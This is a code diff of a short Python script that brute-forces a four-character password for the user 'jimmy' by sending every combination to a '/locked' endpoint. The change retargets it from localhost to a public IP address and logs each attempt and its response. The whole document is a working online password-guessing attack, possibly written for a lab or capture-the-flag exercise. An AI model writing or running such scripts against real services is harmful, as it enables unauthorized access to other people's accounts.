@@ -8,17 +8,18 @@ def alpha():
 
 chars = [alpha() for _ in range(4)]
 
-
 def get_pwd():
+    i = 0
     for chr4 in alpha():
         for chr3 in alpha():
             for chr2 in alpha():
                 for chr1 in alpha():
                     wrd = chr4 + chr3 + chr2 + chr1
                     resp = requests.get(
-                        f"http://localhost:5000/locked?pass={wrd}&user=jimmy"
+                        f"http://34.121.35.187/locked?pass={wrd}&user=jimmy"
                     )
-                    print(resp.status_code)
+                    i += 1
+                    print(f"{wrd}: {resp.text} ({i})")
                     if resp.text != "access denied":
                         return wrd
 
